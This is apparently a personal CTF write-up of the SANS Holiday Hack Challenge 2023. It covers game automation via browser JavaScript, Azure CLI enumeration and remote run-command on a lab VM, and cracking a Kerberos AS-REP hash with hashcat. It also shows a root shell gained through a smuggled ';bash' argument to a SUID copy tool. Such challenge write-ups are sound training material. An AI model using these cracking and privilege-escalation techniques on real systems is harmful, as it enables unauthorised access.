---
title: SANS Holiday Hack Challenge 2023 Writeup
tags:
  - SANS
  - HolidayHackChallenge
  - CTF
  - Writeup
  - Satellite
  - ActiveDirectory
  - Cloud
article_header: object Object
share: "true"
---

# SANS Holiday Hack Challenge 2023

> The SANS Holiday Hack Challenge is a FREE series of super fun, high-quality, hands-on cybersecurity challenges. The SANS Holiday Hack Challenge is for all skill levels, with a prize at the end for the best of the best entries.

>**NOTE**
I never fully finished the Holiday Hack Challenge in its entirety (nor this write-up), leaving a few objectives incomplete by the time the report submission window opened. I still submit my report which was slightly modified from this write-up and [received an honorable mention](https://www.sans.org/mlp/holiday-hack-challenge-2023/winners-and-answers/) despite having not completed the required challenges. I fully recommend completing the challenge in its entirety this year or next as I learned and also taught a lot to friends completing the challenge on their own.

These are my notes.
*queue Law and Order dun-dun*

## Fishing Guide

Once you catch 20 different species of fish, Poinsetta McMittens gives you a mastery task that talks about using `socat` to communicate over a websocket.

This challenge I initially completed without the use of websockets.

Inspecting the HTML source, there's a commented-out `a` tag directly within the `body` element pointing to the page `/sea/fishdensityref.html`. This page contains a long listing of all fish and heatmaps for where they are to be fished.

The code below can be executed within the DOM through the developer console and overlay the heatmap above the minimap.

```js
const heatmap = document.createElement('img');
heatmap.id = 'heatmap';
heatmap.src = `https://2023.holidayhackchallenge.com/sea/assets/noise/${heatmapped_fish}.png`;
const css = "#heatmap { position: absolute; bottom: 0; left: 0; z-index: 999; opacity: 75%; filter: brightness(1) invert(1); mix-blend-mode: multiply; }";
const style = document.createElement('style');
style.type = 'text/css';
style.appendChild(document.createTextNode(css));
document.head.appendChild(style);
document.body.appendChild(heatmap);
```

In order to automate the fishing process _without the use of websockets_, the below Javascript can be executed within the same DOM context also.

```js
const me = () => Entities[playerData.uid];
setInterval(() => {
    if (me().canFish) {
        if (!me().fishing) {
            castReelBtn.click();
        } else {
            if (me().onTheLine) {
                console.log("Caught a", me().onTheLine);
                reelItInBtn.click();
            }
        }
    }
}, 100)
```

```js
const fish = ["Flutterfin Rainbow-Roll", "Gelatina Ringletfin", "Funfetti Flick-Flick", "Fluffle-Muffin Sparklefin", "Jovian Jamboree Jellydonut Jellyfish", "Gumball Glooperfish", "Jester Jellyfin", "The Chocolate Star Gingo Guppy", "Whirly Snuffleback Trout", "Jolly Jellyjam Fish", "Lounging Liquorice Crustacean-Nosed Berryfin", "Jinglefin Jellyfrizzle", "The Polka-Dot-Propeller Puffling Fish", "JubiliFLOPinear Snorkeldonut", "Glittering Gummy Guppy", "Whiskered Whizzler", "Flamango-Buzzling Sushi Swimmer", "Flutterfin Bubblegum Gumball", "ChocoSeahorsefly", "Speckled Toastfin Snorkelback", "Jamboree Jellywing", "Fantabulous Fry-Sherbert Aquapine", "Jamboree Jellofish", "Bubblegum Blowfish-Bee", "Frizzle Fringe Flutterfin", "Whiskered Jumblefish", "Bumblefin Toffee Torpedo", "Jolly Jellypeanut Fish", "Gumbubble Guppy", "Glittering Gummy Whipray", "Flippity Flan Flopper", "Biscuit Bugle-Tail Fish", "Strudel Scuttle Scalefish", "Bubblegum Bumblefin", "Flutterfin Falafeluncher", "The Splendiferous Spaghetti Starfin", "The Rainbow Jelibelly Floatfish", "Rhinoceros Beetle Bumble Tuna", "Hatwearing Hippofish", "Frizzle Fish", "Polka-Pop CandyFloss Fish", "Bumbleberry Floatfish", "Caramelotus Humming Float", "Dandy Candy Goby", "The Polka-Dot Pudding Puff", "Frosted Donut Jellyfluff Puffer", "Flamingo Flapjack Finaticus", "The Splendiferous Spaghetti Seahorsicle", "Flutterfin Scoopscale", "Frizzle Frazzle Fly-n-Fish", "Frizzle-Frizzled Jambalaya Jellyfish", "Sprinkfish", "Fantail Flutterfin", "JellyChip CuddleSwimmer", "Whiskered Lollipop Loonfish", "Jester Gumball Pufferfish", "The Hummingbrewster BumbleFlish", "Jangleroo Snackfin", "Blibbering Blubberwing", "The Bubblegum Confeetish", "Fantastical Fusilloni Flounderfish", "Pizzafin Flutterbub", "The Whiskered Watermelon Pufferfish", "The Bumblebee Doughnut Delphin", "Pistachio Pizzafin Puffinfly", "Aquatic JellyPuff Doughnut Shark", "Gumball Guppygator", "The Burgerwing Seahorse", "Bellychuckle Balloonfish", "FizzleWing PuffleGill", "Bumbleberry Rainbow Flicorn Fish", "Whistlefin Wafflegill", "Pizzadillo Glitter-Guppy", "Jamboree Jellydonut Jellyfish Trout", "The Bubblegum Bumblefin", "Gelatino Floatyfin", "The Frambuzzle Flickerfin", "The Speckled Pizzafin Fizzflyer", "Sparkling Pizzafin Pixie-fish", "Bumblecado Finstache Hybridsail", "Pizzamarine Popcorn Puffer", "Laughter Ligrolomia", "Frosted Jelly Doughnut Pegasus Finfish", "The Whirling Donut Jellygator", "Flutterfin Cupcake Goby", "The Gumball Guppy", "Bubblegum Blowfish Beetle Bug", "Sparkling Gumbubble Piscadot", "The Flamboyant Flutter-fish", "Twinkling Tortellini Trouterfly", "Beatleberry Fluff Guppy.", "Glaze Meringuelle", "The Whiskered Blubberberry Flapper", "Sherbet Swooshfin", "Marzipoisson Popsicala", "Bubblegum Ballistic Barracuda", "Puzzletail Splashcake", "Fantasia Fluffernutter Finfish", "Rainbow Jelly-Dough Fish", "Flutterfin Pizzapuffer", "BugBrella Aquacake", "Twirly Finny Cakeling", "Frizzleberry Flapjack Fish", "Whiskered Sprinkle Glider", "The Pristimaela Parfait Pengu-Angel", "Bubblerooni WhiskerWaffle", "The Speckled Whisker-Spoon Puffer", "BumbleSquid Donutella", "Sparkleberry Gobblefin", "Fizzgiggle Frizzlefin", "JibberJelly Sundae Swimmer", "The Flutterfin Pastry Puffer", "Rainbow Gummy Scalefish", "Jingle JellyFroth Fish", "The Spotted Flutterfin Pastrytetra", "Flutterfin Hotcheeto Penguinfish", "Piscis Cyberneticus Skodo", "Oreo OctoPufferRock", "Fluffernutter Pufferpine", "Whirlygig Polka-Dotted Jelly-Donut Pufferfish", "Bumbleberry Gilled Glider", "Polkadot Pancake Puffer", "Mermacorn Fish", "Sprinkle Starfish Sardine", "Choco-Bumblefin Parrot Trout", "The Fantabulous Gala Glazed-Guppy", "Pudding Puff ParrotMoth Fish", "Fantastical Flapjack Flipperfin", "TruffleBugle ZephyrFish", "Bumbleberry Glitterfin", "The Jester Jellycarafe", "The Flamingotuna McSprinklefin", "Whiskerfroth Flutterfin", "Spotted Sprinkledonut Puffer", "Stripe-tailed Pepperoni Puffer", "Jelly-Feather Macaroon Guppy", "Flutterfin Pancake Puffer.", "Whiskered Rainbow Glidleberry", "Chucklefin Clownfish", "Bumbleberry Snorkelsnout", "Jolly Jellydozer", "The Polka Dotted Jello-fish", "The Bumbleberry Guppiesaurus", "Flutterfin Pizzacrust Glimmertail", "Bumblebee, Pizza-fin Jamboree", "Whizzbizzle Poptuckle", "Candyfloss Clownphino", "Flutterglaze Bumblefin", "Bumbleberry Poptarticus", "Plaid Zephyr Cuddlefin", "Jolly Jambalaya Jubilee Fish", "Confetti Clownfrippery Fish", "Rainbow Jelly-Bumble Shark", "Marshmallow Pogo-Starfish", "The Spangled Jelly-Tortle Ripplefin", "Fantabulous Rainbow Polka Poptartfish", "The ChocoChandelier Goldnipper", "Gummybrella Anemofin", "Gummy Fizzler", "The Bumblebelly Polkadot Glaze-fish", "Fantaray Flakefin", "Splendiferous Ribbontail", "The Butterfleagleberry Seahorse", "Sushinano Sweetsquid", "The Whiskered Melonfin", "The Fantastical Fizzbopper", "Splashtastic Bagelback Rainbownose", "Pizzafly Rainbowgill", "Frizzling Bubblehopper", "Cuckoo Bubblegum Unicornfish", "The Lucid Lollyscale"]
```

Run a check for uncaught fish.
```js
fish.forEach(f => {
    if (!playerData.fishCaught.find(o => o.name == f)) {
        console.log('Missing', f);
    }
});
```

Combining these snippets with a few changes, an automated fishing machine can be written.

```js
const me = () => Entities[playerData.uid];
var targetFish = undefined;

const getUncaught = () => fish.filter(f => !playerData.fishCaught.find(f2 => f == f2.name));

function overlayHeatmap() {
	const css = "#heatmap-current { position: absolute; bottom: 0; left: 0; z-index: 999; margin-bottom: 250px; color: red; } #heatmap { position: absolute; bottom: 0; left: 0; z-index: 999; opacity: 90%; mix-blend-mode: multiply; }";

    const target = document.getElementById('heatmap-current') || document.createElement('span');
    target.id = 'heatmap-current';
    target.innerText = 'Target: ' + targetFish || 'No target.';
	
	const heatmap = document.getElementById('heatmap') || document.createElement('img');
	heatmap.id = 'heatmap';
	heatmap.src = `https://2023.holidayhackchallenge.com/sea/assets/noise/${targetFish}.png`;
	
	const style = document.getElementById('heatmap-style') || document.createElement('style');
	style.id = 'heatmap-style';
	style.type = 'text/css';
	style.appendChild(document.createTextNode(css));

	if (!document.getElementById('heatmap')) {
		document.head.appendChild(style);
		document.body.appendChild(heatmap);
		document.body.appendChild(target);
	}
}

function setNewTarget() {
	getUncaught().forEach(f => {
	    if (!targetFish) {
	        targetFish = f;
	        overlayHeatmap();
            console.log(`Target fish is now a ${f}. Heatmap is displayed.`);
	    }
	});
}

setInterval(() => {
	if (targetFish == undefined) setNewTarget();
	
    if (me().canFish) {
        if (!me().fishing) {
            castReelBtn.click();
        } else {
            if (me().onTheLine) {
	            if (me().onTheLine == targetFish) {
	                console.log(`(${me().fishCaught.length+1}/${fish.length}) Caught a ${me().onTheLine}`);
	                targetFish = undefined;
	            }
	            
                reelItInBtn.click();
            }
        }
    }
}, 500);
```

Inspecting `/sea/js/client.js`, the following codes is on lines `316` and `317`. 

```js
const websockHost = window.SEA_WS_HOST !== 'UNSET' ? window.SEA_WS_HOST : (window.SEA_WS_HOST === 'UNSET' ? 'ws://localhost:3000/sail' : '');
const socket = new WebSocket(`${websockHost}?dockSlip=${UrlParams.dockSlip}`);
```

`window.SEA_WS_HOST` is `wss://2023.holidayhackchallenge.com/sail`
And `UrlParams.dockSlip` looks like a unique uuid.

There's also a `socket.addEventListener("message", ... )` block on line `327` which can offer some insight into how received websocket messages are handled.

| `messageType` | Description                     |
| ------------- | ------------------------------- |
| `e:`          | New entity                      |
| `v:`          | Update entity by UID            |
| `p:`          | Ports list update               |
| `z:`          | Highlight port                  |
| `i:`          | Set playerData                  |
| `b:`          | Blockdata update                |
| `k:`          | Is decoded, but has no porpoise |
| `x:`          | Delete entity                   |
| `t:`          | Notification                    |
| `m:`          | Race results                    |
| `h:`          | Set hotspots                    |
| `a:`          | Ahoy chance                     |
| `f:`          | Fish caught                     |

There's also some dead HTML code in `/sea` that exposes the `/fishdensityref.html` file. Visiting this in the browser just redirects back to the Holiday Hack Challenge, but the response exposes the existence of `/js/main/christmasmagic.js`, which looks like some JavaScript written for [NodeJS](https://nodejs.org/en/learn/getting-started/introduction-to-nodejs) that [Webpack](https://webpack.js.org/concepts/) had its way with.

![Pasted image 20231224023101.png](Pasted%20image%2020231224023101.png)

> Webpack can be explained in just over 2 minutes [here](https://www.youtube.com/watch?v=5zeXFC_-gMQ). NodeJS [here](https://www.youtube.com/watch?v=q-xS25lsN3I).

When Webpack transforms a NodeJS application into the resulting `bundle.js` file it will be difficult for a human to interpret or reverse engineer without a [source map](https://web.dev/articles/source-maps). This file, usually named something like `bundle.js.map`, contains information needed to _map_ the compiled code back to it's original _source_ code (or close to it). This enables easier debugging and interpretation.

It turned out that the source map was placed in the same directory on the webserver as `christmasmagic.js` at `/js/main/christmasmagic.js.map`, probably from Alabaster by mistake. Thanks!

Depending on the browser, there are different ways to make developer tools aware of a source map.
- In Chrome's **Sources** tab, it can be imported by right-clicking the transformed file and importing a source map.
- In Firefox, if the transformed file doesn't already contain `//# sourceMappingURL=/js/main/christmasmagic.js.map`,  it can be entered into the **Console** and processed the same.

Importing the source map into developer tools will generate new entries in the site map list under `webpack://` for a NodeJS application using the React framework.

![Pasted image 20231224022946.png](./images/Pasted%20image%2020231224022946.png)

## Christmas Island

### Rudolph's Rest Resort

Sparkle Redberry asks us for help interfacing with his Azure server (really just walking us through a `az-cli` 101 for a future task).

`~# az account show | less`

```json
{
  "environmentName": "AzureCloud",
  "id": "2b0942f3-9bca-484b-a508-abdae2db5e64",
  "isDefault": true,
  "name": "northpole-sub",
  "state": "Enabled",
  "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
  "user": {
    "name": "northpole@northpole.invalid",
    "type": "user"
  }
}
```

And to get a list of resource groups.

`~# az group list | less`

```json
[
  {
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1",
    "location": "eastus",
    "managedBy": null,
    "name": "northpole-rg1",
    "properties": {
      "provisioningState": "Succeeded"
    },
    "tags": {}
  },
  {
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2",
    "location": "westus",
    "managedBy": null,
    "name": "northpole-rg2",
    "properties": {
      "provisioningState": "Succeeded"
    },
    "tags": {}
  }
]
```

And the function apps for a particular resource group (we only can access functionapps in one).

`~# az functionapp show --resource-group northpole-rg1`

```json
[
  {
    "appServicePlanId": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/serverfarms/EastUSLinuxDynamicPlan",
    "availabilityState": "Normal",
    "clientAffinityEnabled": false,
    "clientCertEnabled": false,
    "clientCertExclusionPaths": null,
    "clientCertMode": "Required",
    "cloningInfo": null,
    "containerSize": 0,
    "customDomainVerificationId": "201F74B099FA881DB9368A26C8E8B8BB8B9AF75BF450AF717502AC151F59DBEA",
    "dailyMemoryTimeQuota": 0,
    "defaultHostName": "northpole-ssh-certs-fa.azurewebsites.net",
    "enabled": true,
    "enabledHostNames": [
      "northpole-ssh-certs-fa.azurewebsites.net"
    ],
    "extendedLocation": null,
    "hostNameSslStates": [
      {
        "certificateResourceId": null,
        "hostType": "Standard",
        "ipBasedSslResult": null,
        "ipBasedSslState": "NotConfigured",
        "name": "northpole-ssh-certs-fa.azurewebsites.net",
        "sslState": "Disabled",
        "thumbprint": null,
        "toUpdate": null,
        "toUpdateIpBasedSsl": null,
        "virtualIPv6": null,
        "virtualIp": null
      },
      {
        "certificateResourceId": null,
        "hostType": "Repository",
        "ipBasedSslResult": null,
        "ipBasedSslState": "NotConfigured",
        "name": "northpole-ssh-certs-fa.scm.azurewebsites.net",
        "sslState": "Disabled",
        "thumbprint": null,
        "toUpdate": null,
        "toUpdateIpBasedSsl": null,
        "virtualIPv6": null,
        "virtualIp": null
      }
    ],
    "hostNames": [
      "northpole-ssh-certs-fa.azurewebsites.net"
    ],
    "hostNamesDisabled": false,
    "hostingEnvironmentProfile": null,
    "httpsOnly": false,
    "hyperV": false,
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa",
    "identity": {
      "principalId": "d3be48a8-0702-407c-89af-0319780a2aea",
      "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
      "type": "SystemAssigned",
      "userAssignedIdentities": null
    },
    "inProgressOperationId": null,
    "isDefaultContainer": null,
    "isXenon": false,
    "keyVaultReferenceIdentity": "SystemAssigned",
    "kind": "functionapp,linux",
    "lastModifiedTimeUtc": "2023-11-09T14:43:01.183333",
    "location": "East US",
    "maxNumberOfWorkers": null,
    "name": "northpole-ssh-certs-fa",
    "outboundIpAddresses": "",
    "possibleOutboundIpAddresses": "",
    "publicNetworkAccess": null,
    "redundancyMode": "None",
    "repositorySiteName": "northpole-ssh-certs-fa",
    "reserved": true,
    "resourceGroup": "northpole-rg1",
    "scmSiteAlsoStopped": false,
    "siteConfig": {
      "acrUseManagedIdentityCreds": false,
      "acrUserManagedIdentityId": null,
      "alwaysOn": false,
      "antivirusScanEnabled": null,
      "apiDefinition": null,
      "apiManagementConfig": null,
      "appCommandLine": null,
      "appSettings": null,
      "autoHealEnabled": null,
      "autoHealRules": null,
      "autoSwapSlotName": null,
      "azureMonitorLogCategories": null,
      "azureStorageAccounts": null,
      "connectionStrings": null,
      "cors": null,
      "customAppPoolIdentityAdminState": null,
      "customAppPoolIdentityTenantState": null,
      "defaultDocuments": null,
      "detailedErrorLoggingEnabled": null,
      "documentRoot": null,
      "elasticWebAppScaleLimit": null,
      "experiments": null,
      "fileChangeAuditEnabled": null,
      "ftpsState": null,
      "functionAppScaleLimit": 200,
      "functionsRuntimeScaleMonitoringEnabled": null,
      "handlerMappings": null,
      "healthCheckPath": null,
      "http20Enabled": true,
      "http20ProxyFlag": null,
      "httpLoggingEnabled": null,
      "ipSecurityRestrictions": null,
      "ipSecurityRestrictionsDefaultAction": null,
      "javaContainer": null,
      "javaContainerVersion": null,
      "javaVersion": null,
      "keyVaultReferenceIdentity": null,
      "limits": null,
      "linuxFxVersion": "Python|3.11",
      "loadBalancing": null,
      "localMySqlEnabled": null,
      "logsDirectorySizeLimit": null,
      "machineKey": null,
      "managedPipelineMode": null,
      "managedServiceIdentityId": null,
      "metadata": null,
      "minTlsCipherSuite": null,
      "minTlsVersion": null,
      "minimumElasticInstanceCount": 0,
      "netFrameworkVersion": null,
      "nodeVersion": null,
      "numberOfWorkers": 1,
      "phpVersion": null,
      "powerShellVersion": null,
      "preWarmedInstanceCount": null,
      "publicNetworkAccess": null,
      "publishingPassword": null,
      "publishingUsername": null,
      "push": null,
      "pythonVersion": null,
      "remoteDebuggingEnabled": null,
      "remoteDebuggingVersion": null,
      "requestTracingEnabled": null,
      "requestTracingExpirationTime": null,
      "routingRules": null,
      "runtimeADUser": null,
      "runtimeADUserPassword": null,
      "scmIpSecurityRestrictions": null,
      "scmIpSecurityRestrictionsDefaultAction": null,
      "scmIpSecurityRestrictionsUseMain": null,
      "scmMinTlsVersion": null,
      "scmType": null,
      "sitePort": null,
      "sitePrivateLinkHostEnabled": null,
      "storageType": null,
      "supportedTlsCipherSuites": null,
      "tracingOptions": null,
      "use32BitWorkerProcess": null,
      "virtualApplications": null,
      "vnetName": null,
      "vnetPrivatePortsCount": null,
      "vnetRouteAllEnabled": null,
      "webSocketsEnabled": null,
      "websiteTimeZone": null,
      "winAuthAdminState": null,
      "winAuthTenantState": null,
      "windowsConfiguredStacks": null,
      "windowsFxVersion": null,
      "xManagedServiceIdentityId": null
    },
    "slotSwapStatus": null,
    "state": "Running",
    "storageAccountRequired": false,
    "suspendedTill": null,
    "tags": {
      "create-cert-func-url-path": "/api/create-cert?code=candy-cane-twirl",
      "project": "northpole-ssh-certs"
    },
    "targetSwapSlot": null,
    "trafficManagerHostNames": null,
    "type": "Microsoft.Web/sites",
    "usageState": "Normal",
    "virtualNetworkSubnetId": null,
    "vnetContentShareEnabled": false,
    "vnetImagePullEnabled": false,
    "vnetRouteAllEnabled": false
  }
]
```

And finally, list VMs in a particular resource group and to invoke a `run-command` against it.

`~# az vm list --resource-group northpole-rg2`

```json
[
  {
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2/providers/Microsoft.Compute/virtualMachines/NP-VM1",
    "location": "eastus",
    "name": "NP-VM1",
    "properties": {
      "hardwareProfile": {
        "vmSize": "Standard_D2s_v3"
      },
      "provisioningState": "Succeeded",
      "storageProfile": {
        "imageReference": {
          "offer": "UbuntuServer",
          "publisher": "Canonical",
          "sku": "16.04-LTS",
          "version": "latest"
        },
        "osDisk": {
          "caching": "ReadWrite",
          "createOption": "FromImage",
          "managedDisk": {
            "storageAccountType": "Standard_LRS"
          },
          "name": "VM1_OsDisk_1"
        }
      },
      "vmId": "e5f16214-18be-4a31-9ebb-2be3a55cfcf7"
    },
    "resourceGroup": "northpole-rg2",
    "tags": {}
  }
]
```

`~# az vm run-command invoke -g northpole-rg2 -n NP-VM1 --command-id RunShellScript --scripts "ls"`

```json
{
  "value": [
    {
      "code": "ComponentStatus/StdOut/succeeded",
      "displayStatus": "Provisioning succeeded",
      "level": "Info",
      "message": "bin\netc\nhome\njinglebells\nlib\nlib64\nusr\n",
      "time": 1702178855
    },
    {
      "code": "ComponentStatus/StdErr/succeeded",
      "displayStatus": "Provisioning succeeded",
      "level": "Info",
      "message": "",
      "time": 1702178855
    }
  ]
}
```

Note that the `value[0].message` key value is the output of our `RunShellScript` command.

I used `jq` to extract this value and to interpret backslash escapes.

I also encased the command within a bash function to more easily invoke this command in the future.

```
~# invoke() { az vm run-command invoke -g northpole-rg2 -n NP-VM1 --command-id RunShellScript --scripts "$1" | jq -r '.value[0].message'; }
```

Now I can invoke commands like:

`~# invoke "ls -la"`

```
total 52
drwxr-x--- 1 0 0 4096 Dec  4 20:38 .
drwxr-x--- 1 0 0 4096 Dec  4 20:38 ..
drwxr-x--- 1 0 0 4096 Dec  4 20:37 bin
drwxr-xr-x 1 0 0 4096 Dec  4 20:38 etc
drwxr-x--- 1 0 0 4096 Dec  2 22:16 home
-rwxr-x--- 1 0 0    0 Dec  4 20:37 jinglebells
drwxr-xr-x 1 0 0 4096 Dec  4 20:37 lib
drwxr-xr-x 1 0 0 4096 Dec  4 20:37 lib64
drwxr-xr-x 1 0 0 4096 Dec  4 20:37 usr
```

After a little enumeration I discovered the folder `/home/adminuser` on the system, but no other findings.


## Island of Misfit Toys

### Scaredy Kite Heights

#### Hashcat

Eve Snowshoes tells us of how Alabaster is in a predicament.

Eve is trying to recovery a password using parallelization but can't figure it out.

A poem is presented upon entering Eve's terminal.

```
In a realm of bytes and digital cheer,  
The festive season brings a challenge near.  
Santa's code has twists that may enthrall,  
It's up to you to decode them all.

Hidden deep in the snow is a kerberos token,  
Its type and form, in whispers, spoken.  
From reindeers' leaps to the elfish toast,  
Might the secret be in an ASREP roast?

`hashcat`, your reindeer, so spry and true,  
Will leap through hashes, bringing answers to you.  
But heed this advice to temper your pace,  
`-w 1 -u 1 --kernel-accel 1 --kernel-loops 1`, just in case.

For within this quest, speed isn't the key,  
Patience and thought will set the answers free.  
So include these flags, let your command be slow,  
And watch as the right solutions begin to show.

For hints on the hash, when you feel quite adrift,  
This festive link, your spirits, will lift:  
https://hashcat.net/wiki/doku.php?id=example_hashes

And when in doubt of `hashcat`'s might,  
The CLI docs will guide you right:  
https://hashcat.net/wiki/doku.php?id=hashcat

Once you've cracked it, with joy and glee so raw,  
Run /bin/runtoanswer, without a flaw.  
Submit the password for Alabaster Snowball,  
Only then can you claim the prize, the best of all.

So light up your terminal, with commands so grand,  
Crack the code, with `hashcat` in hand!  
Merry Cracking to each, by the pixelated moon's light,  
May your hashes be merry, and your codes so right!

* Determine the hash type in hash.txt and perform a wordlist cracking attempt to find which password is correct and submit it to /bin/runtoanswer .*
```

This tells us that there is a kerberos AS-REP hash in `hash.txt`.

```
$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966
```

This is referred to by hashcat as the hash type `18200: Kerberos 5, etype 23, AS-REP`.

A simple `ls` also reveals `password_list.txt`, and with the arguments from the `HELP` file:

`~# hashcat -m 18200 -w 1 -u 1 --force --kernel-accel 1 --kernel-loops 1 ./hash.txt ./password_list.txt`

```
$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966:IluvC4ndyC4nes!

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2...dd1966
Time.Started.....: Sun Dec 10 08:45:09 2023 (0 secs)
Time.Estimated...: Sun Dec 10 08:45:09 2023 (0 secs)
Guess.Base.......: File (./password_list.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      794 H/s (1.11ms) @ Accel:1 Loops:1 Thr:64 Vec:16
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 144/144 (100.00%)
Rejected.........: 0/144 (0.00%)
Restore.Point....: 0/144 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-0
Candidates.#1....: 1LuvCandyC4n3s!2022 -> iLuvC4ndyC4n3s!23!
```

The recovered password is `IluvC4ndyC4nes!`.

#### Ostrich Saloon

![Pasted image 20231210004852.png](Pasted%20image%2020231210004852.png)

Rose Mold, a troll from Planet Frost, requires our help escalating privileges in Linux.

Like the previous challenge, a poem is presented upon entering the terminal.

```
In a digital winter wonderland we play,
Where elves and bytes in harmony lay.
This festive terminal is clear and bright,
Escalate privileges, and bring forth the light.

Start in the land of bash, where you reside,
But to win this game, to root you must glide.
Climb the ladder, permissions to seize,
Unravel the mystery, with elegance and ease.

There lies a gift, in the root's domain,
An executable file to run, the prize you'll obtain.
The game is won, the challenge complete,
Merry Christmas to all, and to all, a root feat!

* Find a method to escalate privileges inside this terminal and then run the binary in /root *
```

Let's start by finding all files owned by root but writable by others.

`~$ find / -user root -writable -exec ls -ld {} \; 2>/dev/null`

```
drwxrwxrwt 1 root root 4096 Dec  2 22:17 /tmp
drwxrwxrwt 2 root root 4096 Nov 28 02:06 /var/tmp
lrwxrwxrwx 1 root root 9 Nov 28 02:03 /var/lock -> /run/lock
lrwxrwxrwx 1 root root 11 Dec 10 08:50 /dev/core -> /proc/kcore
lrwxrwxrwx 1 root root 15 Dec 10 08:50 /dev/stderr -> /proc/self/fd/2
lrwxrwxrwx 1 root root 15 Dec 10 08:50 /dev/stdout -> /proc/self/fd/1
lrwxrwxrwx 1 root root 15 Dec 10 08:50 /dev/stdin -> /proc/self/fd/0
lrwxrwxrwx 1 root root 13 Dec 10 08:50 /dev/fd -> /proc/self/fd
lrwxrwxrwx 1 root root 8 Dec 10 08:50 /dev/ptmx -> pts/ptmx
crw-rw-rw- 1 root root 1, 9 Dec 10 08:50 /dev/urandom
crw-rw-rw- 1 root root 1, 5 Dec 10 08:50 /dev/zero
crw-rw-rw- 1 root root 5, 0 Dec 10 08:50 /dev/tty
crw-rw-rw- 1 root root 1, 7 Dec 10 08:50 /dev/full
crw-rw-rw- 1 root root 1, 8 Dec 10 08:50 /dev/random
crw-rw-rw- 1 root root 1, 3 Dec 10 08:50 /dev/null
drwxrwxrwt 2 root root 40 Dec 10 08:50 /dev/shm
drwxrwxrwt 2 root root 40 Dec 10 08:50 /dev/mqueue
crw-rw-rw- 1 root root 5, 2 Dec 10 08:56 /dev/pts/ptmx
crw-rw-rw- 1 root root 1, 3 Dec 10 08:50 /proc/keys
crw-rw-rw- 1 root root 1, 3 Dec 10 08:50 /proc/kcore
crw-rw-rw- 1 root root 1, 3 Dec 10 08:50 /proc/timer_list
crw-rw-rw- 1 root root 1, 3 Dec 10 08:50 /proc/sched_debug
drwxrwxrwt 2 root root 4096 Nov 28 02:03 /run/lock
```

And also executable files with the SUID bit set.

`~$ find / -executable -perm -4000 2>/dev/null`

```
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/simplecopy
```

`/usr/bin/simplecopy` really stands out. It seems to be just a homemade copy tool written in C/C++.

After some efforts to gain an understanding of the inner workings of this program with a few manual fuzzing attempts (invalid files, long strings) it's discovered that the applications passes its arguments **unescaped** to another program (`cp`) on the system to do the acutal work.

Since the input is unescaped we can inject commands to be run in the context of the `root` user due to the `SETUID` permission bit being set on `simplecopy`.

`~$ simplecopy ";bash" ""`

```
elf@4020b9adad3f:~$ simplecopy ";bash" ""
cp: missing file operand
Try 'cp --help' for more information.

root@4020b9adad3f:~# id
uid=0(root) gid=0(root) groups=0(root),1000(elf)
```

In the `HELP` file under elf's home directory that we were presented earlier, the instructions said to run a binary under `/root`.

`~# /root/runmetoanswer`

```
Who delivers Christmas presents?

> Santa Claus
Your answer: Santa Claus

Checking....
Sorry, that answer is incorrect. Please try again!
```

After some futile attempts to guess the name as "Santa \[Claus\[e\]\]" was incorrect, I inspected the binary a little further by running `strings`.

Skimming the output of `strings` it's discovered that the binary was written in Rust lang and looks for a YAML file somewhere.

```
...
Something went wrong reading the configuration file Couldn't parse YAML file: Couldn't open file: attempt to join into collection with len > usize::MAX/usr/src/rustc-1.48.0/library/alloc/src
...
(with lots of references to Cargo packages and rust-related directories)
...
```

Let's look for a YAML file owned by `root`.

`~$ find / -name "*.y*ml" -user root 2>/dev/null`

And get the output of the only file discovered.

```
~$ cat /etc/runtoanswer.yaml
```

```yaml
# This is the config file for runtoanswer, where you can set up your challenge!
---

# This is the completionSecret from the Content sheet - don't tell the user this!
key: b08b538569e395f88e12ef9fe751ac39

# The answer that the user is expected to enter - case sensitive
# (This is optional - if you don't have an answer, then running this will immediately win)
answer: "santa"

text: |
  Who delivers Christmas presents?

